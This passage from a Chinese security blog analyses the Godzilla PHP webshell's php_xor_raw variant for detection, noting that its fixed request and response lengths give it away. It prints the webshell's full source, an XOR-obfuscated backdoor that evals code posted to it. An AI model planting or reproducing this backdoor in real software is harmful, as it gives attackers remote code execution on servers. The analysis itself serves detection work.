&#125;</span><br></pre></td></tr></table></figure>
+
+<h2 id="php-xor-raw"><a href="#php-xor-raw" class="headerlink" title="php_xor_raw"></a>php_xor_raw</h2><p>看完base64的，我们看看php_xor_raw，还是先看webshell文件</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">session_start();</span><br><span class="line">@set_time_limit(0);</span><br><span class="line">@error_reporting(0);</span><br><span class="line">function E($D,$K)&#123;</span><br><span class="line">    for($i=0;$i&lt;strlen($D);$i++) &#123;</span><br><span class="line">        $D[$i] = $D[$i]^$K[$i+1&amp;15];</span><br><span class="line">    &#125;</span><br><span class="line">    return $D;</span><br><span class="line">&#125;</span><br><span class="line">function Q($D)&#123;</span><br><span class="line">    return base64_encode($D);</span><br><span class="line">&#125;</span><br><span class="line">function O($D)&#123;</span><br><span class="line">    return base64_decode($D);</span><br><span class="line">&#125;</span><br><span class="line">function I()&#123;</span><br><span class="line">    return &quot;php://input&quot;;</span><br><span class="line">&#125;</span><br><span class="line">$V=&apos;payload&apos;;</span><br><span class="line">$T=&apos;3c6e0b8a9c15224a&apos;;</span><br><span class="line"></span><br><span class="line">    $F=O(E(file_get_contents(I()),$T));</span><br><span class="line">    if (isset($_SESSION[$V]))&#123;</span><br><span class="line">        $L=$_SESSION[$V];</span><br><span class="line">        $A=explode(&apos;|&apos;,$L);</span><br><span class="line">        class C&#123;public function nvoke($p) &#123;eval($p.&quot;&quot;);&#125;&#125;</span><br><span class="line">        $R=new C();</span><br><span class="line">		$R-&gt;nvoke($A[0]);</span><br><span class="line">        echo E(run($F),$T);</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        $_SESSION[$V]=$F;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+
+<p>可以看到这里把密码的判断删除了，直接从<code>php://input</code>接收输入（毕竟有不可见字符）</p>
+<p>php://input 是个可以访问请求的原始数据的只读流。 POST 请求的情况下，最好使用 php://input 来代替 $HTTP_RAW_POST_DATA，因为它不依赖于特定的 php.ini 指令。</p>
+<p>流程就不重复说了，跟上面的是一样的</p>
+<p>因为这个不存url编码的问题，所以长度是固定的，第一次的HTTP回应包的body也是0，这个比base64更容易检测</p>
+<p>前两次的请求长度和响应长度分别如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">17300 0</span><br><span class="line">28 4</span><br></pre></td></tr></table></figure>
+
+<p><img src="http://pic.giantbranch.cn/pic/1599040587791.png" alt></p>
+<p><img src="http://pic.giantbranch.cn/pic/1599040623587.png" alt></p>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+      <div>
+        <div style="padding: 10px 0; margin: 20px auto; width: 90%; text-align: center;">
+  <div>自愿打赏专区</div>
+  <button id="rewardButton" disable="enable" onclick="var qr = document.getElementById('QR'); if (qr.style.display === 'none') {qr.style.display='block';} else {qr.style.display='none'}">
+    <span>打赏</span>
+  </button>
+  <div id="QR" style="display: none;">
+
+    
+      <div id="wechat" style="display: inline-block">
+        <img id="wechat_qr" src="http://paypic.giantbranch.cn/wechat.png" alt="giantbranch 微信支付">
+        <p>微信支付</p>
+      </div>
+    
+
+    
+      <div id="alipay" style="display: inline-block">
+        <img id="alipay_qr" src="http://paypic.giantbranch.cn/alipay.png" alt="giantbranch 支付宝">
+        <p>支付宝</p>
+      </div>
+    
+
+    
+
+  </div>
+</div>
+
+      </div>
+    
+    
+      <div class="footer-custom">
+        <b>paypal: <a href="https://www.paypal.me/giantbranch">https://www.paypal.me/giantbranch</a> </b>
+      </div>
+    
+
+    
+    <div style="padding: 10px 0; margin: 20px auto; width: 100%; text-align: center;">
+    	<div><img src="http://paypic.giantbranch.cn/ask.png"></div>
+    </div>
+      <div>
+        <ul class="post-copyright">
+  <li class="post-copyright-author">
+    <strong>本文作者：</strong>
+    giantbranch
+  </li>
+  <li class="post-copyright-link">
+    <strong>本文链接：</strong>
+    <a href="https://www.giantbranch.cn/2020/08/18/哥斯拉Godzilla PHP Webshell分析与检测特征提取/" title="哥斯拉Godzilla PHP Webshell分析与检测特征提取">https://www.giantbranch.cn/2020/08/18/哥斯拉Godzilla PHP Webshell分析与检测特征提取/</a>
+  </li>
+  <li class="post-copyright-license">
+    <strong>版权声明： </strong>
+    本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/3.0/" rel="external nofollow" target="_blank">CC BY-NC-SA 3.0</a> 许可协议。转载请注明出处！
+  </li>
+</ul>
+
+      </div>
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/webshell/" rel="tag"># webshell</a>
+          
+            <a href="/tags/Godzilla/" rel="tag"># Godzilla</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2020/08/17/冰蝎v3.0 Beta 2(Behinder_v3.0 Beta 2)Webshell分析与检测/" rel="next" title="冰蝎v3.0 Beta 2(Behinder_v3.0 Beta 2)Webshell分析与检测">
+                <i class="fa fa-chevron-left"></i> 冰蝎v3.0 Beta 2(Behinder_v3.0 Beta 2)Webshell分析与检测
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2020/08/21/冰蝎 Behinder_v3.0 Beta 3 重点更新简析/" rel="prev" title="冰蝎 Behinder_v3.0 Beta 3 重点更新简析">
+                冰蝎 Behinder_v3.0 Beta 3 重点更新简析 <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+        
+  <div class="bdsharebuttonbox">
+    <a href="#" class="bds_tsina" data-cmd="tsina" title="分享到新浪微博"></a>
+    <a href="#" class="bds_douban" data-cmd="douban" title="分享到豆瓣网"></a>
+    <a href="#" class="bds_sqq" data-cmd="sqq" title="分享到QQ好友"></a>
+    <a href="#" class="bds_qzone" data-cmd="qzone" title="分享到QQ空间"></a>
+    <a href="#" class="bds_weixin" data-cmd="weixin" title="分享到微信"></a>
+    <a href="#" class="bds_tieba" data-cmd="tieba" title="分享到百度贴吧"></a>
+    <a href="#" class="bds_twi" data-cmd="twi" title="分享到Twitter"></a>
+    <a href="#" class="bds_fbook" data-cmd="fbook" title="分享到Facebook"></a>
+    <a href="#" class="bds_more" data-cmd="more"></a>
+    <a class="bds_count" data-cmd="count"></a>
+  </div>
+  <script>
+    window._bd_share_config = {
+      "common": {
+        "bdText": "",
+        "bdMini": "2",
+        "bdMiniList": false,
+        "bdPic": ""
+      },
+      "share": {
+        "bdSize": "16",
+        "bdStyle": "0"
+      },
+      "image": {
+        "viewList": ["tsina", "douban", "sqq", "qzone", "weixin", "twi", "fbook"],
+        "viewText": "分享到：",
+        "viewSize": "16"
+      }
+    }
+  </script>
+
+<script>
+  with(document)0[(getElementsByTagName('head')[0]||body).appendChild(createElement('script')).src='//bdimg.share.baidu.com/static/api/js/share.js?cdnversion='+~(-new Date()/36e5)];
+</script>
+
+      
+    </div>
+    <div class="footer-custom">
+	<b>假如你看不到评论，可能是你访问Disqus被墙了，请使用代理访问</b>
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+  
+    <div class="comments" id="comments">
+      <div id="disqus_thread">
+        <noscript>
+          Please enable JavaScript to view the
+          <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a>
+        </noscript>
+      </div>
+    </div>
+  
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <p class="site-author-name" itemprop="name">giantbranch</p>
+              <p class="site-description motion-element" itemprop="description"></p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/">
+              
+                  <span class="site-state-item-count">160</span>
+                  <span class="site-state-item-name">日志</span>
+                </a>
+              </div>
+            
+
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                <a href="/tags/index.html">
+                  <span class="site-state-item-count">201</span>
+                  <span class="site-state-item-name">标签</span>
+                </a>
+              </div>
+            
+
+          </nav>
+
+          
+            <div class="feed-link motion-element">
+              <a href="/atom.xml" rel="alternate">
+                <i class="fa fa-rss"></i>
+                RSS
+              </a>
+            </div>
+          
+
+          <div class="links-of-author motion-element">
+            
+              
+                <span class="links-of-author-item">
+                  <a href="https://github.com/giantbranch" target="_blank" title="GitHub">
+                    
+                      <i class="fa fa-fw fa-github"></i>GitHub</a>
+                </span>
+              
+                <span class="links-of-author-item">
+                  <a href="https://twitter.com/giantbranch" target="_blank" title="Twitter">
+                    
+                      <i class="fa fa-fw fa-twitter"></i>Twitter</a>
+                </span>
+              
+            
+          </div>
+
+          
+          
+
+          
+          
+            <div class="links-of-blogroll motion-element links-of-blogroll-inline">
+              <div class="links-of-blogroll-title">
+                <i class="fa  fa-fw fa-globe"></i>
+                Links
+              </div>
+              <ul class="links-of-blogroll-list">
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://blog.csdn.net/u012763794" title="my csdn blog" target="_blank">my csdn blog</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://oldblog.giantbranch.cn/" title="old blog" target="_blank">old blog</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://weaponx.site/" title="WeaponX" target="_blank">WeaponX</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://www.tasfa.cn/" title="Tasfa" target="_blank">Tasfa</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://matshao.com/" title="MatShao" target="_blank">MatShao</a>
+                  </li>
+                
+              </ul>
+            </div>
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#实验环境"><span class="nav-number">1.</span> <span class="nav-text">实验环境</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#以php为例的webshell分析"><span class="nav-number">2.</span> <span class="nav-text">以php为例的webshell分析</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#php-xor-base64"><span class="nav-number">2.1.</span> <span class="nav-text">php_xor_base64</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#第一次发送很多功能的PHP代码"><span class="nav-number">2.1.1.</span> <span class="nav-text">第一次发送很多功能的PHP代码</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#第二次调用test函数"><span class="nav-number">2.1.2.</span> <span class="nav-text">第二次调用test函数</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#第三次获取基本信息"><span class="nav-number">2.1.3.</span> <span class="nav-text">第三次获取基本信息</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#php-xor-raw"><span class="nav-number">2.2.</span> <span class="nav-text">php_xor_raw</span></a></li></ol></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; 2017 &mdash; <span itemprop="copyrightYear">2023</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">giantbranch</span>
+
+  
+</div>
+
+
+  <div class="powered-by">由 <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a> 强力驱动</div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">主题 &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Muse</a> v5.1.3</div>
+
+
+
+
+<div class="footer-custom">
+<!-- <a href="https://beian.miit.gov.cn/">粤ICP备16051028号-1</a> -->
+<br>
+这是我的新博客，网站建于2017年10月
+<!-- <br>以下UV,PV统计始于2018.06.23 -->
+</div>
+
+        
+<div class="busuanzi-count">
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+  
+
+  
+</div>
+
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+
+  
+  <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+
+  
+  <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+
+  
+  <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+
+  
+  <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+
+  
+  <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.3"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.3"></script>
+
+
+
+  
+  
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.3"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.3"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.3"></script>
+
+
+
+  
+
+
+  
+
+    
+      <script id="dsq-count-scr" src="https://giantbranch.disqus.com/count.js" async></script>
+    
+
+    
+      <script type="text/javascript">
+        var disqus_config = function () {
+          this.page.url = 'https://www.giantbranch.cn/2020/08/18/哥斯拉Godzilla PHP Webshell分析与检测特征提取/';
+          this.page.identifier = '2020/08/18/哥斯拉Godzilla PHP Webshell分析与检测特征提取/';
+          this.page.title = '哥斯拉Godzilla PHP Webshell分析与检测特征提取';
+        };
+        var d = document, s = d.createElement('script');
+        s.src = 'https://giantbranch.disqus.com/embed.js';
+        s.setAttribute('data-timestamp', '' + +new Date());
+        (d.head || d.body).appendChild(s);
+      </script>
+    
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
